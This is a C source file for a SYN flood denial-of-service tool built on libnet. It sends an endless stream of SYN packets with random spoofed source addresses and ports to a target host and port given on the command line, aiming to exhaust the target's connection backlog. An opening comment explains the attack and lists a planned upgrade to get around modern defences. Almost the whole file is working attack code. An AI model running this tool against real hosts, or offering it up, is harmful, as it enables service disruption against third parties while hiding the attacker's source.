/* 
    A SYN flood tries to exhause states in the TCP/IP stack.
    Since TCP maintanes a state, this state needs to be tracked somewhere.
    The stack in the kernel only has a finite amount of space, so we can use spoofing 
    to exhaust the available memory. These half-open requests will go into a backlog queue
    but the responding ACk from the spoofed address never come, so each request has to time-out
    which can take a long time

    FUTURE UPGRADES:
        -  Get around modern day protections that prevent this from working (Don't know if this
            is possible given modern day solutions don't allocate memory for half open connections)
*/
#define _DEFAULT_SOURCE
#include <libnet.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <arpa/inet.h>

#define FLOOD_DELAY 5000 // Delay between packet injects by 5000 ms

/* Returns an IP address in the x.x.x.x format */
char *print_ip(u_long *ip_addr_ptr) {
    return inet_ntoa(*((struct in_addr *) ip_addr_ptr));
}

int main(int argc, char *argv[]) {
    u_char errbuf[LIBNET_ERRBUF_SIZE];
    u_long dest_ip;
    u_short dest_port;
    libnet_t *context;
    libnet_ptag_t tcp_tag, ip_tag = 0;
    int byte_count, packet_size = LIBNET_IPV4_H + LIBNET_TCP_H;

    // Ensure we have correct number of arguments
    if (argc < 3) {
        printf("Usage:\n%s\t <target_host> <target_port>\n", argv[0]);
        exit(1);
    }

    // Create a libnet context
    context = libnet_init(LIBNET_RAW4, NULL, errbuf);
    if (context == NULL) {
        printf("There was an error creating the libnet context: %s\n", errbuf);
        exit(1);
    }

    // Get the host and port from input
    dest_ip = libnet_name2addr4(context, argv[1], LIBNET_RESOLVE);
    dest_port = (u_short) atoi(argv[2]);

    // Open network interface - Don't think need to do this with libnet_init

    // Initialize packet memory - Same here ^

    // Seed the random # generator
    libnet_seed_prand(context);

    while(1) {
        // Build TCP header
        tcp_tag = libnet_build_tcp(libnet_get_prand(LIBNET_PRu16), // Source TCP port
            dest_port,                                   // Destination port
            libnet_get_prand(LIBNET_PRu32),             // Sequence number
            libnet_get_prand(LIBNET_PRu32),             // Ack number
            TH_SYN,                                     // Control flags
            libnet_get_prand(LIBNET_PRu16),             // Window size
            0,                                          // Checksum (0 to autofill)
            0,                                          // Urgent pointer
            LIBNET_TCP_H,                               // Total length of the TCP packet
            NULL,                                       // Payload
            0,                                          // Length of payload
            context,                                    // Pointer to libnet_t context
            0                                     // Build a new header
        );

        if (tcp_tag == -1) {
            printf("There was an error creating the tcp header: %s\n", libnet_geterror(context));
            exit(1);
        }

        // Build IP header
        ip_tag = libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_TCP_H, // Size of the packet
            IPTOS_LOWDELAY,                 // Type of service bits
            libnet_get_prand(LIBNET_PRu16), // IP identification number
            0,                              // Fragmenation bits and offset
            libnet_get_prand(LIBNET_PR8), // TTL (time to live)
            IPPROTO_TCP,                    // Transport protcol
            0,                              // Checksum (0 means autofill)
            libnet_get_prand(LIBNET_PRu32), // Source IP address
            dest_ip,                        // Destination IP address
            NULL,                           // Payload or NULL
            0,                              // Payload length or 0
            context,                        // Pointer to libnet_t context
            0                          // Build new header
        );

        if (ip_tag == -1) {
            printf("There was an error creating the ip header: %s\n", libnet_geterror(context));
            exit(1);
        }

        // Inject packet
        byte_count = libnet_write(context);

        if (byte_count == -1) {
            printf("ERROR: libnet_write() failed: %s\n", libnet_geterror(context));
            exit(1);
        }

        if (byte_count < packet_size) {
            printf("WARNING: Incomplete packet written: %d of %d written: %s\n", byte_count, packet_size, libnet_geterror(context));
            exit(1);
        }

        // Clear the packet so we can send multiple
        libnet_clear_packet(context);

        usleep(FLOOD_DELAY);
    }

    // Destroy the packet memory and close the network interfact
    libnet_destroy(context);

    return 0;
}